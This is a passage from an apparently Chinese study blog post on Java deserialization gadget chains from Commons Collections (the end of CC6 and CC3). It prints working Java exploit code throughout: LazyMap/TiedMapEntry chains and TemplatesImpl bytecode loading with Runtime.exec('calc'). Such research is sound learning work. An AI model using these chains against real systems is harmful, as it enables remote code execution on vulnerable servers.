class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功执行, 结束</p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC3就和CC1、CC6不同了，后者是执行命令，而前者是通过动态加载类，然后实例化类达到执行静态代码块的目的</p><p>因此我们先来复习一下类的动态加载和双亲委派机制</p><h2 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h2><p>在此之前需要介绍2个代码块，<strong>静态代码块和构造代码块</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    system.out.printIn(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"> system.out.printIn(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类进行__初始化__的时候, __静态代码块__会被执行</p><p>在类进行__实例化__的时候，__构造代码块和构造函数和静态代码块__一并执行</p><p>例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        System.out.println(word);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载类并默认进行初始化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222635510.png" alt="image-20240510222635510"></p><p>加载类但不初始化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader c1=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class.forName(<span class="string">&quot;org.example.Person&quot;</span>,<span class="literal">false</span>,c1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510223610815.png" alt="image-20240510223610815"></p><p>实例化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222941281.png" alt="image-20240510222941281"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><blockquote><p>所谓的双亲委派机制，指的就是：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</strong><br>那么，什么情况下父加载器会无法加载某一个类呢？<br>其实，Java中提供的这四种类型的加载器，是有各自的职责的：</p><ul><li>Bootstrap ClassLoader ，主要负责加载Java核心类库，%JRE_HOME%\lib下的rt.jar、resources.jar、charsets.jar和class等。</li><li>Extention ClassLoader，主要负责加载目录%JRE_HOME%\lib\ext目录下的jar包和class文件。</li><li>Application ClassLoader ，主要负责加载当前应用的classpath下的所有类</li><li>User ClassLoader ， 用户自定义的类加载器,可加载指定路径的class文件</li></ul></blockquote><h2 id="URLclassLoader任意类加载"><a href="#URLclassLoader任意类加载" class="headerlink" title="URLclassLoader任意类加载"></a>URLclassLoader任意类加载</h2><p>这个类里面还有一个loadclass方法，可以通过URL加载类</p><h2 id="ClassLoader加载字节码执行命令"><a href="#ClassLoader加载字节码执行命令" class="headerlink" title="ClassLoader加载字节码执行命令"></a>ClassLoader加载字节码执行命令</h2><p>通过跟进调试双亲委派机制, 我们发现最终是<code>Classloader.defineClass</code>加载字节码来加载类, 那么, 就可以反射获取<code>defineClass</code>来直接加载任意类</p><p>生成目标类字节码文件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射加载类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Method defineclass=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineclass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineclass.invoke(c, <span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511204156647.png" alt="image-20240511204156647"></p><h2 id="Unsafe加载字节码"><a href="#Unsafe加载字节码" class="headerlink" title="Unsafe加载字节码"></a>Unsafe加载字节码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; hello = unsafe.defineClass(<span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length, c, <span class="literal">null</span>);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次我获取的是unsafe的属性，而不是<code>defineClass</code>方法，同样的unsafe类也有definclass方法，但是他是原生的类（底层C加载），因此反射过来无法调用, 因此我们需要先获取Unsafe对象，进而调用definclass方法，最后加载任意类从而实现命令执行</p><h2 id="链子分析-2"><a href="#链子分析-2" class="headerlink" title="链子分析"></a>链子分析</h2><p>CC3采用的是动态加载类，也就是上面讲基础时用到过的<code>ClassLoder.defineclass</code>,因此我们寻找谁调用了defineclass方法</p><p>在java核心库中, 在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader里调用了:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222124553.png" alt="image-20240511222124553"></p><p>继续跟进, 看看该类的哪里调用了defineclass</p><p>在<code>defineTransletClasses</code>中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222341863.png" alt="image-20240511222341863"></p><p>可以看见这里有调用, 但是必须绕过第一个判断, 我们翻上去看<code>_bytecodes</code>的默认值就是null, 因此需要反射赋值, 否则是无法执行到defineclass的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222952049.png" alt="image-20240511222952049"></p><p>这里调用<code>_tfactory.getExternalExtensionsMap()</code>, 因此<code>_tfactory</code>也不能为空</p><p>不过好在在readObject中<code>_tfactory</code>会被自动赋值, 因此我们不必关心</p><p>继续看哪里调用了<code>defineTransletClasses</code></p><p>当前类中能够搜索到三处调用,  我们只关心<code>getTransletInstance</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223533379.png" alt="image-20240511223533379"></p><p>这里的if判断依然是需要反射赋值,</p><p>继续跟进哪里调用了<code>getTransletInstance</code></p><p>只有一个<code>newTransformer</code>对其进行了调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223717794.png" alt="image-20240511223717794"></p><p>至此, 现在的思路就是实例化一个<code>TemplatesImpl</code>,然后调用它的<code>newTransformer</code>方法, 以此来达到加载任意类的目的</p><p>编写demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519195412264.png" alt="image-20240519195412264"></p><p>运行会报错</p><p>这里大意了, 在类中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>一个是一个二维的数组</p><p>因此我们需要改写一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519201358854.png" alt="image-20240519201358854"></p><p>之后这里仍然会报错, 我们跟进调试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202511737.png" alt="image-20240519202511737"></p><p>问题出在了这里, 这里进入了419行, 将_transletIndex赋值成了小于一的数, 导致进入428行抛出错误</p><p>为了避免进入419行, 我们加载的类必须满足其继承<code>ABSTRACT_TRANSLET</code>这个类, 我们点进去可以看见</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202807342.png" alt="image-20240519202807342"></p><p>因此我们只需要恶意继承一下即可</p><p>我们修改要加载的类为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 继承AbstractTranslet必须重写以下方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译好后运行我们的demo,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519203400370.png" alt="image-20240519203400370"></p><p>这里仍然会看到报错, 但是已经成功了!</p><p>但是目前这条链子仍然受限于需要newTransformer()的调用这一先决条件</p><p>我们可以使用CC1的链子来调用这个newTransformer()方法,从而触发任意类加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 